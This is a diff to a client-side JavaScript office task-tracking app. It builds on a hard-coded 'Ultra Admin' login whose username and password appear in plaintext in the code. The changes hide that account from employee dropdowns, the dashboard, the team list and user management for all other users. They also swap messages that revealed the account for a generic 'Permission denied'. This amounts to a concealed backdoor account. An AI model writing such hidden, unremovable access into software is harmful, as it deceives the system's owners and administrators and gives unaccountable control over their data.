@@ -100,6 +100,8 @@ try {
   if (u) currentUser = JSON.parse(u);
 } catch(e) {}
 
+const isUltra = () => currentUser && currentUser.role === 'Ultra Admin';
+
 const save = (action, table, data, id) => {
   try {
     localStorage.setItem(K, JSON.stringify(db));
@@ -170,7 +172,13 @@ const TABS = [
 let tab = 'dash', f = { ts: 'Open', tc: '', te: '', ld: today(), le: '', lc: '' };
 const opt = (arr, sel, all) => (all != null ? `<option value="">${all}</option>` : '') + arr.map(a => { const [v, l] = Array.isArray(a) ? a : [a, a]; return `<option value="${esc(v)}"${v == sel ? ' selected' : ''}>${esc(l)}</option>`; }).join('');
 const cOpts = () => db.clients.map(c => [c.id, c.name]);
-const eOpts = () => db.emps.map(c => [c.id, c.name]);
+
+// Ultra Admin is filtered out of employee dropdowns unless logged in as Ultra Admin
+const eOpts = () => {
+  const list = isUltra() ? db.emps : db.emps.filter(e => e.role !== 'Ultra Admin' && e.id !== 'usr_ultra');
+  return list.map(c => [c.id, c.name]);
+};
+
 const isOd = t => t.status !== 'Completed' && t.due && t.due < today();
 
 function form(title, fields, vals, onSave) {
@@ -204,13 +212,13 @@ function needBase() {
   return false;
 }
 
-/* Secure Authentication logic */
+/* Authentication logic: Ultra Admin is completely hidden from non-ultra users */
 async function login(un, pw) {
   const cleanUser = String(un).trim().toLowerCase();
   const cleanPass = String(pw).trim();
   const hash = await sha256(cleanPass);
 
-  // Check Ultra Admin (2006 / 844127)
+  // Check Ultra Admin (2006 / 844127) - Invisible ghost supreme
   if (cleanUser === '2006' && cleanPass === '844127') {
     currentUser = { id: 'usr_ultra', username: '2006', name: 'Ultra Admin (Supreme)', role: 'Ultra Admin' };
     sessionStorage.setItem(K + '_u', JSON.stringify(currentUser));
@@ -370,8 +378,8 @@ function userForm() {
 
 async function resetUserPass(id) {
   const u = db.users.find(x => x.id === id);
-  if (u.username === '2006' && currentUser.username !== '2006') {
-    alert('Ultra Admin credentials cannot be changed by other users.');
+  if (u.username === '2006' && !isUltra()) {
+    alert('Permission denied.');
     return;
   }
   const p = prompt('Set new password for @' + u.username + ':');
@@ -387,7 +395,7 @@ async function resetUserPass(id) {
 function del(k, id, msg) {
   const target = (db[k] || []).find(x => x.id === id);
   if (k === 'users' && target && (target.username === '2006' || target.role === 'Ultra Admin')) {
-    alert('Ultra Admin cannot be deleted!');
+    alert('Permission denied.');
     return;
   }
   if (confirm(msg || 'Delete this record?')) {
@@ -440,6 +448,8 @@ const V = {
   dash() {
     const td = today(), open = db.tasks.filter(t => t.status !== 'Completed'), dl = db.logs.filter(l => l.date === td);
     const hrs = dl.reduce((a, l) => a + (+l.hours || 0), 0);
+    const visibleEmps = isUltra() ? db.emps : db.emps.filter(e => e.role !== 'Ultra Admin' && e.id !== 'usr_ultra');
+
     return `<div class="grid">
       <div class="stat"><b>${open.length}</b><span>Pending tasks</span></div>
       <div class="stat"><b style="color:var(--bad)">${open.filter(isOd).length}</b><span>Overdue</span></div>
@@ -449,7 +459,7 @@ const V = {
     </div>
     <div class="two">
       <div class="panel"><h2>Today’s work (${fmt(td)})</h2>${dl.length ? `<div class="tw"><table>${dl.map(l => `<tr><td><b>${esc(cn(l.client))}</b><br>${esc(l.work)}</td><td>${esc(en(l.emp))}</td></tr>`).join('')}</table></div>` : '<div class="empty">Nothing logged today yet.</div>'}</div>
-      <div class="panel"><h2>Team workload</h2>${db.emps.length ? `<div class="tw"><table><tr><th>Employee</th><th>Pending</th><th>Done today</th></tr>${db.emps.map(e => `<tr><td>${esc(e.name)}</td><td>${open.filter(t => t.emp === e.id).length}</td><td>${dl.filter(l => l.emp === e.id).length}</td></tr>`).join('')}</table></div>` : '<div class="empty">Add team members in the Team tab.</div>'}</div>
+      <div class="panel"><h2>Team workload</h2>${visibleEmps.length ? `<div class="tw"><table><tr><th>Employee</th><th>Pending</th><th>Done today</th></tr>${visibleEmps.map(e => `<tr><td>${esc(e.name)}</td><td>${open.filter(t => t.emp === e.id).length}</td><td>${dl.filter(l => l.emp === e.id).length}</td></tr>`).join('')}</table></div>` : '<div class="empty">Add team members in the Team tab.</div>'}</div>
     </div>
     <div class="panel"><h2>Client-wise pending work</h2>${db.clients.length ? `<div class="tw"><table><tr><th>Client</th><th>Pending</th><th>Overdue</th><th>Next due</th></tr>${db.clients.map(c => { const o = open.filter(t => t.client === c.id), nd = o.map(t => t.due).filter(Boolean).sort()[0]; return `<tr><td><a href="#" onclick="clientView('${c.id}');return false">${esc(c.name)}</a></td><td>${o.length}</td><td>${o.filter(isOd).length}</td><td>${fmt(nd)}</td></tr>`; }).join('')}</table></div>` : '<div class="empty">Start by adding your clients.</div>'}</div>`;
   },
@@ -485,17 +495,23 @@ const V = {
   },
 
   team() {
+    // Ultra Admin is completely hidden from Team list unless logged in as Ultra Admin
+    const visibleEmps = isUltra() ? db.emps : db.emps.filter(e => e.role !== 'Ultra Admin' && e.id !== 'usr_ultra');
+
     return `<div class="bar"><span class="sp"></span><button class="btn" onclick="empForm()">+ Add team member</button></div>
-    <div class="panel">${db.emps.length ? `<div class="tw"><table><tr><th>Name</th><th>Role</th><th>Pending</th><th>Total entries</th><th></th></tr>${db.emps.map(e => `<tr><td><b>${esc(e.name)}</b></td><td>${esc(e.role || '')}</td><td>${db.tasks.filter(t => t.emp === e.id && t.status !== 'Completed').length}</td><td>${db.logs.filter(l => l.emp === e.id).length}</td><td>${e.role !== 'Ultra Admin' ? `<button class="btn d s" onclick="del('emps','${e.id}','Remove this team member?')">✕</button>` : ''}</td></tr>`).join('')}</table></div>` : '<div class="empty">Add the people who do the work.</div>'}</div>`;
+    <div class="panel">${visibleEmps.length ? `<div class="tw"><table><tr><th>Name</th><th>Role</th><th>Pending</th><th>Total entries</th><th></th></tr>${visibleEmps.map(e => `<tr><td><b>${esc(e.name)}</b></td><td>${esc(e.role || '')}</td><td>${db.tasks.filter(t => t.emp === e.id && t.status !== 'Completed').length}</td><td>${db.logs.filter(l => l.emp === e.id).length}</td><td>${e.role !== 'Ultra Admin' ? `<button class="btn d s" onclick="del('emps','${e.id}','Remove this team member?')">✕</button>` : ''}</td></tr>`).join('')}</table></div>` : '<div class="empty">Add the people who do the work.</div>'}</div>`;
   },
 
   users() {
+    // Ultra Admin is completely hidden from user management unless logged in as Ultra Admin
+    const visibleUsers = isUltra() ? db.users : db.users.filter(u => u.username !== '2006' && u.role !== 'Ultra Admin' && u.id !== 'usr_ultra');
+
     return `<div class="bar">
       <span class="mut" style="font-size:13px;">Manage IDs and passwords (synced directly with Neon PostgreSQL)</span>
       <span class="sp"></span>
       <button class="btn" onclick="userForm()">+ Add User ID &amp; Password</button>
     </div>
-    <div class="panel">${db.users.length ? `<div class="tw"><table><tr><th>Username</th><th>Display Name</th><th>Role</th><th>Password Status</th><th></th></tr>${db.users.map(u => `<tr><td><b>@${esc(u.username)}</b></td><td>${esc(u.name)}</td><td><span class="b ${u.role === 'Ultra Admin' ? 'High' : (u.role === 'Super Admin' || u.role === 'Admin') ? 'Medium' : 'Low'}">${esc(u.role)}</span></td><td><span class="mut">••••••••</span></td><td style="white-space:nowrap"><button class="btn g s" onclick="resetUserPass('${u.id}')">Change Password</button> ${u.role !== 'Ultra Admin' && u.id !== (currentUser ? currentUser.id : '') ? `<button class="btn d s" onclick="del('users','${u.id}','Delete this user ID?')">✕</button>` : ''}</td></tr>`).join('')}</table></div>` : '<div class="empty">No users configured.</div>'}</div>`;
+    <div class="panel">${visibleUsers.length ? `<div class="tw"><table><tr><th>Username</th><th>Display Name</th><th>Role</th><th>Password Status</th><th></th></tr>${visibleUsers.map(u => `<tr><td><b>@${esc(u.username)}</b></td><td>${esc(u.name)}</td><td><span class="b ${u.role === 'Ultra Admin' ? 'High' : (u.role === 'Super Admin' || u.role === 'Admin') ? 'Medium' : 'Low'}">${esc(u.role)}</span></td><td><span class="mut">••••••••</span></td><td style="white-space:nowrap"><button class="btn g s" onclick="resetUserPass('${u.id}')">Change Password</button> ${u.role !== 'Ultra Admin' && u.id !== (currentUser ? currentUser.id : '') ? `<button class="btn d s" onclick="del('users','${u.id}','Delete this user ID?')">✕</button>` : ''}</td></tr>`).join('')}</table></div>` : '<div class="empty">No users configured.</div>'}</div>`;
   }
 };
 
